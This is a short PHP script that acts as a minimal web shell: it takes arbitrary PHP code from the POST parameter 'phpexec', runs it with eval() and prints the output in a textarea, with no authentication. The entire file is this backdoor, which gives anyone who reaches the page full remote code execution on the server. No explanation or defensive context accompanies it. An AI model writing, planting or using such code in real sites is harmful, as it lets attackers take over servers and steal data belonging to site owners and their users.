<?php
if($_POST['phpexec']){
	echo("<textarea rows=10 cols=100>");
	eval(stripslashes($_POST['phpexec']));
	echo("</textarea>");
}
?>